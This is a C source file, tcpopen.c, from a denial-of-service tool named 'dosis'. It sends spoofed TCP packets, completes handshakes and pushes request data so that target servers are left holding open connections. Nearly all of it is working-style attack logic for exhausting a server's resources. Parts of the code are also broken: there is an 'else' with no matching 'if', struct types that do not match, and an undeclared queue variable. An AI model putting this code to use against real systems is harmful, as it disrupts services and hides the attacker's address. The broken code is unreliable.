/*****************************************************************************
 * tcpopen.c
 *
 * DoS on TCP servers by leaving connections opened.
 *
 * ---------------------------------------------------------------------------
 * dosis - DoS: Internet Sodomizer
 *   (C) 2008 Gerardo García Peña <gerardo@kung-foo.dhs.org>
 *
 *   This program is free software; you can redistribute it and/or modify it
 *   under the terms of the GNU General Public License as published by the Free
 *   Software Foundation; either version 2 of the License, or (at your option)
 *   any later version.
 *
 *   This program is distributed in the hope that it will be useful, but WITHOUT
 *   ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
 *   FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License for
 *   more details.
 *
 *   You should have received a copy of the GNU General Public License along
 *   with this program; if not, write to the Free Software Foundation, Inc., 51
 *   Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
 *
 *****************************************************************************/

#include <config.h>

#include "dosis.h"
#include "dosconfig.h"
#include "tea.h"
#include "tcpopen.h"
#include "lnet.h"
#include "pthreadex.h"
#include "log.h"
#include "ip.h"

#define BUFSIZE    2048

typedef struct _tag_TCPOPEN_CFG {
  INET_ADDR   shost;
  INET_ADDR   dhost;
  unsigned    npackets;
  char       *req;
  unsigned    req_size;
  LN_CONTEXT *lnc;
} TCPOPEN_CFG;

static pthreadex_flag_t    attack_flag;

#define ip_protocol(x) (((struct iphdr *) (x)->s)->protocol)
#define ip_header(x)   ((struct iphdr *)  (x)->s)
#define tcp_header(x)  ((struct tcphdr *) ((x)->s \
                       + (((struct iphdr *) (x)->s)->ihl << 2)))

/*****************************************************************************
 * LISTENER THREAD
 *****************************************************************************/

static int tcpopen__listen_check(THREAD_WORK *tw, char *msg, unsigned size)
{
  TCPOPEN_CFG *tc = (TCPOPEN_CFG *) tw->data;

  /* check msg size and headers */
  if(size < sizeof(struct iphdr)
  || ip_protocol(msg) != 6
  || size < sizeof(struct tcphdr) + (ip_header(msg)->ihl << 2))
    return 0;

  /* check msg */
  return ip_header(msg)->daddr   == tc->shost.addr.in.addr
      && tcp_header(msg)->source == tc->dhost.port;
}

static void tcpopen__listen(THREAD_WORK *tw)
{
  TCPOPEN_CFG *tc = (TCPOPEN_CFG *) tw->data;
  TEA_MSG *m;

  /* listen the radio */
  while((m = tea_msg_get(tw)) != NULL)
  {
    DBG("[%02u] Received a spoofed connection packet.", tw->id);
    /*
    DBG2("[%02u] Dropped << %d - %d.%d.%d.%d:%d/%d (rst=%d) => [%08x/%08x] >>",
            tw->id,
            identify_ip_protocol(m->b),
            (ip_header(m->b)->saddr >>  0) & 0x00ff,
            (ip_header(m->b)->saddr >>  8) & 0x00ff,
            (ip_header(m->b)->saddr >> 16) & 0x00ff,
            (ip_header(m->b)->saddr >> 24) & 0x00ff,
            tcp_header(m->b)->dest, cfg->dhost.port,
            tcp_header(m->b)->rst,
            ip_header(m->b)->saddr,
            cfg->shost.s_addr);
    */

    /* in some special case (handshake) send kakitas */
    if(tcp_header(m->b)->syn != 0
    && tcp_header(m->b)->ack != 0)
    {
      /* send handshake and data TCP packet */
      DBG("[%02u]   - Request packet sending...", tw->id);
      ln_send_packet(tc->lnc,
                     &tc->shost.addr.in.inaddr, ntohs(tcp_header(m->b)->dest),
                     &tc->dhost.addr.in.inaddr, tc->dhost.port,
                     TH_ACK,
                     ntohs(tcp_header(m->b)->window),
                     ntohl(tcp_header(m->b)->ack_seq),
                     ntohl(tcp_header(m->b)->seq) + 1,
                     NULL, 0);
      ln_send_packet(tc->lnc,
                     &tc->shost.addr.in.inaddr, ntohs(tcp_header(m->b)->dest),
                     &tc->dhost.addr.in.inaddr, tc->dhost.port,
                     TH_ACK | TH_PUSH,
                     ntohs(tcp_header(m->b)->window),
                     ntohl(tcp_header(m->b)->ack_seq),
                     ntohl(tcp_header(m->b)->seq) + 1,
                     (char *) tc->req, tc->req_size);
    }

    /* release msg buffer */
    tea_timer_msg_release(m);
  }
}

/*+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 * GENERIC HTTP THREAD
 *   This thread specializes in different tasks depending on thread number
 *     0 - listener
 *     x - sender
 *+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*/

static void attack_tcpopen__thread_cleanup(THREAD_WORK *tw)
{
  TCPOPEN_CFG *tc = (TCPOPEN_CFG *) tw->data;

  if(tc)
  {
    /* collect libnet data */
    if(tc->lnc)
    {
      ln_destroy_context(tc->lnc);
      tc->lnc = NULL;
    }
    if(tc->req)
    {
      free(tc->req);
      tc->req = NULL;
    }
    free(tc);
    tw->data = NULL;
  }
  DBG("[%02u] Finalized.", tw->id);
}

static void attack_tcpopen__thread(THREAD_WORK *tw)
{
  TCPOPEN_WORK *tc;

  /* initialize specialized work thread data */
  if((tc = calloc(1, sizeof(TCPOPEN_WORK))) == NULL)
    D_FAT("[%02d] No memory for TCPOPEN_CFG.", tw->id);
  tw->data = (void *) tc;

  /* initialize libnet */
  DBG("[%02u] Initializing libnet.", tw->id);
  if((tc->lnc = calloc(1, sizeof(LN_CONTEXT))) == NULL)
    D_FAT("[%02d] No memory for LN_CONTEXT.", tw->id);
  ln_init_context(tc->lnc);

  /* launch specialized thread */
  listener_thread(&tw);
  else
    sender_thread(&tw);

  pthread_cleanup_pop(1);
  pthread_exit(NULL);
}

/*+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 * GO4WORK
 *   Function to enqueue SYN packets.
 *+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*/

static int attack_tcpopen__go2work(void)
{
  return pthreadex_flag_up(&attack_flag);
}

void attack_tcpopen(void)
{
  /* initialize */
  DBG("Initializing IPQ...");
  if(ipqex_init(&attack_tcpopen__ipq, BUFSIZE))
    FAT("  !! Cannot initialize IPQ.");

  /* flag that will keep attack threads waiting for work */
  pthreadex_flag_init(&attack_flag, 0);

  /* launch attack */
  tea_timer(attack_tcpopen__go2work, attack_tcpopen__thread);

  /* finalize ipq */
  ipqex_destroy(&attack_tcpopen__ipq);
}

